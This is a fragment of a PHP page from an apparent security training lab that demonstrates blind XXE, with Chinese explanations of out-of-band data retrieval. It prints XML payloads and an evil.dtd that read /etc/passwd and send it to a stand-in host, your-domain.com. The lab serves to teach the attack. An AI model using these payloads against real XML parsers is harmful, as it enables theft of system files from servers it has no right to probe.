...
$module_name = '盲XXE';
$module_icon = '🕵️';
$module_desc = '无回显的XXE利用，通过带外通道获取数据。';
...
<div class="card">
        ...
        <div class="card-body">
            <div class="alert alert-danger">
                ...
                本场景演示盲XXE漏洞。<br>
                当XXE漏洞没有直接回显时，攻击者可以通过带外通道（OOB）来获取数据，如DNS请求、HTTP请求等。
            </div>
...
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://your-domain.com/"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>

                    <h5 class="mb-2 mt-4">2. 读取文件并通过HTTP发送</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY % dtd SYSTEM "http://your-domain.com/evil.dtd"&gt;
    %dtd;
    %send;
]&gt;
&lt;root&gt;
...
&lt;/root&gt;</code></pre>
                    ...
                    <h5 class="mb-2 mt-4">3. evil.dtd内容</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;!ENTITY % all "&lt;!ENTITY &#37; send SYSTEM 'http://your-domain.com/?data=%file;'&gt;"&gt;
%all;</code></pre>
                </div>
            </div>
...
if ($result) {
    $content .= '<div class="alert alert-secondary">
                        ...
                        <p class="text-muted">注：盲XXE需要使用带外通道获取数据，请检查您的DNS或HTTP服务器日志</p>
                    </div>';
}
